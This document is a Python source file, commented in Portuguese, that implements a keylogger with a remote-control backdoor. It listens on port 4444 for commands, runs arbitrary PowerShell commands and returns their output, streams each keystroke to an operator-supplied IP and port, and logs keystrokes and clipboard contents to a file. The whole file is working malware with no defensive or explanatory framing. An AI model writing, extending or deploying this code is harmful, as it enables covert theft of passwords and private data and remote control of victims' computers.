import socket
import keyboard # Para função de captura de teclas
import pyperclip # Para funão de clipboard
import time
import multiprocessing
import subprocess
import re
resultado = ""

def rede(ip, porta):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, porta))
            while True:   
                tecla = keyboard.read_event()
                if tecla.event_type == keyboard.KEY_DOWN:
                    tecla_nome = str(tecla.name)
                    try:
                        sock.send(tecla_nome.encode())
                        time.sleep(0.01)
                    except (BrokenPipeError, ConnectionResetError):
                        break
        except (ConnectionError, TimeoutError):
            time.sleep(2)
        finally:
            sock.close()

def log(arqvlog):
    texto = ""
    while True:
        with open(fr'{arqvlog}', "a", encoding='utf-8') as log_arquivo:
            tecla = keyboard.read_event()
            novo_texto = pyperclip.paste()
            if novo_texto != texto:
                    log_arquivo.write(f"\n\nTexto copiado:\n{novo_texto}\n\n")
                    log_arquivo.flush()
                    texto = novo_texto

            if tecla.event_type == keyboard.KEY_DOWN:
                tecla_nome = str(tecla.name)
                log_arquivo.write(f'[{tecla_nome}] ')
                log_arquivo.flush()

def exe(comando):
    global resultado
    try:
        resultado = subprocess.check_output(['powershell', '-Command', comando], shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        resultado = e.output





def initrede(ip, portaa):
    porta = int(portaa)
    rede_processo = multiprocessing.Process(target=rede, args=(ip, porta))
    rede_processo.start()

def initlog(arqvlog):
    log_processo = multiprocessing.Process(target=log, args=(arqvlog))
    log_processo.start()






def main():
    ip_local = "127.0.0.1"
    porta_local = 4444
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((ip_local, porta_local))
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.listen(1)

    funcoes = {
        'keylogrede': lambda ip_server, porta_server: initrede(ip_server, porta_server), 
        # cria um função lambda que recebe os valores ip_server e porta_server e envia para initrede que recebe como ip e porta
        'keyloglocal': lambda valor: initlog(valor),
        'exe': exe,
        'sair': lambda client_socket: client_socket.close()
    }

    while True:
        try:
            client_socket, client_address = listener.accept()
            while True:
                dado = client_socket.recv(4096).decode('utf-8').strip()

                if dado:
                    if '=' not in dado:
                        client_socket.sendall((f"Erro: Argumento inválido '{dado}'. Use o formato func=valor1,valor2\n").encode('utf-8'))
                        continue

                    funcao, valor = dado.split('=', 1)
                    valores = re.split(r'[,]', valor)

                    if funcao in funcoes:
                        if funcao == 'exe':
                            funcoes[funcao](*valores)
                            client_socket.sendall(resultado)

                        elif funcao == 'keyloglocal':
                            funcoes[funcao](valores[0]) 

                        elif funcao == 'keylogrede':
                            funcoes[funcao](*valores)

                        else:
                            client_socket.sendall((f"Função '{funcao}' não reconhecida\n").encode())
                            
                    else:
                        client_socket.send((f"Função {funcao} Não reconhecida\n").encode())
                else:
                    continue

        except (ConnectionError, socket.error):
            continue


if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
